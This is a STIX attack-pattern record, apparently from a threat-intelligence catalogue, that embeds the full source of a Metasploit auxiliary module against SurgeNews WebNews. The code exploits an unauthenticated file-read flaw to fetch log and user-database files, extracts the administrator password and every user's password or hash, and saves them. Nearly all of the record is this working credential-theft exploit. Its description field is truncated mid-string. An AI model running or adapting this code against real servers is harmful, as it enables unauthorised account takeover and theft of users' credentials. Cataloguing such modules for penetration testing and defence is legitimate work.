{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d34f3990-4925-4daa-815f-27ec96a127cf",
    "created": "2024-08-14T16:29:17.906627Z",
    "modified": "2024-08-14T16:29:17.906631Z",
    "name": "SurgeNews User Credentials",
    "description": " This module exploits a vulnerability in the WebNews web interface of SurgeNews on TCP ports 9080 and 8119 which allows unauthenticated users to download arbitrary files from the software root directory; including the user database, configuration files and log files.  This module extracts the administrator username and password, and the usernames and passwords or password hashes for all users.  This module has been tested successfully on SurgeNews version 2.0a-13 on Windows 7 SP 1 and 2.0a-12 on Ubuntu Linux.  'License' => MSF_LICENSE 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/surgenews_user_creds.rb",
            "external_id": "surgenews_user_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  HttpFingerprint = { pattern: [ /DManager/ ] }\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SurgeNews User Credentials',\n        'Description' => %q{\n          This module exploits a vulnerability in the WebNews web interface\n          of SurgeNews on TCP ports 9080 and 8119 which allows unauthenticated\n          users to download arbitrary files from the software root directory;\n          including the user database, configuration files and log files.\n\n          This module extracts the administrator username and password, and\n          the usernames and passwords or password hashes for all users.\n\n          This module has been tested successfully on SurgeNews version\n          2.0a-13 on Windows 7 SP 1 and 2.0a-12 on Ubuntu Linux.\n        },\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['URL', 'http://news.netwinsite.com:8119/webnews?cmd=body&item=34896&group=netwin.surgemail'],\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'Author' => 'bcoles',\n        'DisclosureDate' => '2017-06-16'\n      )\n    )\n\n    register_options [ Opt::RPORT(9080) ]\n  end\n\n  def max_retries\n    3\n  end\n\n  def check_host(_ip)\n    @tries = 0\n    res = read_file 'install.log'\n    if res =~ /SurgeNews/\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def read_file(file)\n    data = nil\n    @tries += 1\n    vprint_status \"Retrieving file: #{file}\"\n    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'webnews'),\n                           'vars_get' => { 'cmd' => 'part', 'fname' => file }\n    if !res\n      vprint_error 'Connection failed'\n    elsif res.code == 550\n      vprint_error \"Could not find file '#{file}'\"\n    elsif res.code == 200 && res.body =~ /550 Key: No key activated/\n      # unregistered software throws an error once in every ~20 requests\n      # try again...\n      if @tries >= max_retries\n        vprint_error \"Failed to retrieve file '#{file}' after max retries (#{max_retries})\"\n      else\n        vprint_status 'Retrying...'\n        return read_file file\n      end\n    elsif res.code == 200 && !res.body.empty?\n      vprint_good \"Found #{file} (#{res.body.length} bytes)\"\n      data = res.body\n    else\n      vprint_error 'Unexpected reply'\n    end\n    @tries = 0\n    data\n  end\n\n  def parse_log(log_data)\n    return if log_data.nil?\n\n    username = log_data.scan(/value_set\\(manager\\)\\((.*)\\)/).flatten.reject { |c| c.to_s.empty? }.last\n    password = log_data.scan(/value_set\\(password\\)\\((.*)\\)/).flatten.reject { |c| c.to_s.empty? }.last\n    { 'username' => username, 'password' => password }\n  end\n\n  def parse_user_db(user_data)\n    return if user_data.nil?\n\n    creds = []\n    user_data.lines.each do |line|\n      next if line.eql? ''\n\n      next unless line =~ /^(.+?):(.*):Groups=/\n\n      user = ::Regexp.last_match(1)\n      pass = ::Regexp.last_match(2)\n      # clear text credentials are prefaced with '*'\n      if pass.starts_with? '*'\n        creds << { 'username' => user, 'password' => pass[1..] }\n      # otherwise its a hash\n      else\n        creds << { 'username' => user, 'hash' => pass }\n      end\n    end\n    creds\n  end\n\n  def run_host(_ip)\n    @tries = 0\n\n    service_data = {\n      address: rhost,\n      port: rport,\n      service_name: (ssl ? 'https' : 'http'),\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    cred_table = Rex::Text::Table.new 'Header' => 'SurgeNews User Credentials',\n                                      'Indent' => 1,\n                                      'Columns' => ['Username', 'Password', 'Password Hash', 'Admin']\n\n    # Read administrator password from password.log\n    admin = parse_log read_file 'password.log'\n    # If password.log doesn't contain credentials\n    # then the password hasn't been updated since install.\n    # Retrieve the credentials from install.log instead.\n    admin = parse_log read_file 'install.log' if admin.nil?\n\n    if admin.nil?\n      vprint_error 'Found no administrator credentials'\n    else\n      print_good \"Found administrator credentials (#{admin['username']}:#{admin['password']})\"\n      cred_table << [admin['username'], admin['password'], nil, true]\n\n      credential_data = {\n        origin_type: :service,\n        module_fullname: fullname,\n        private_type: :password,\n        private_data: admin['password'],\n        username: admin['username']\n      }\n\n      credential_data.merge! service_data\n      credential_core = create_credential credential_data\n      login_data = {\n        core: credential_core,\n        access_level: 'Administrator',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n      login_data.merge! service_data\n      create_credential_login login_data\n    end\n\n    # Read user credentials from nwauth.add\n    users = parse_user_db read_file 'nwauth.add'\n    if users.blank?\n      vprint_error 'Found no user credentials in nwauth.add'\n      return\n    end\n    vprint_status \"Found #{users.length} users in nwauth.add\"\n\n    unless users.nil?\n      users.each do |user|\n        next if user.empty?\n\n        cred_table << [user['username'], user['password'], user['hash'], false]\n\n        if user['password']\n          print_good \"Found user credentials (#{user['username']}:#{user['password']})\"\n          credential_data = {\n            origin_type: :service,\n            module_fullname: fullname,\n            private_type: :password,\n            private_data: user['password'],\n            username: user['username']\n          }\n        else\n          credential_data = {\n            origin_type: :service,\n            module_fullname: fullname,\n            private_type: :nonreplayable_hash,\n            private_data: user['hash'],\n            username: user['username']\n          }\n        end\n\n        credential_data.merge! service_data\n        credential_core = create_credential credential_data\n        login_data = {\n          core: credential_core,\n          access_level: 'User',\n          status: Metasploit::Model::Login::Status::UNTRIED\n        }\n        login_data.merge! service_data\n        create_credential_login login_data\n      end\n    end\n\n    print_line\n    print_line cred_table.to_s\n\n    p = store_loot 'surgenews.user.creds', 'text/csv', rhost, cred_table.to_csv, 'SurgeNews User Credentials'\n    print_good \"Credentials saved in: #{p}\"\n  end\nend\n",
    "x_mitre_contributors": [
        "bcoles",
        ""
    ],
    "x_mitre_disclosure_date": "2017-06-16"
}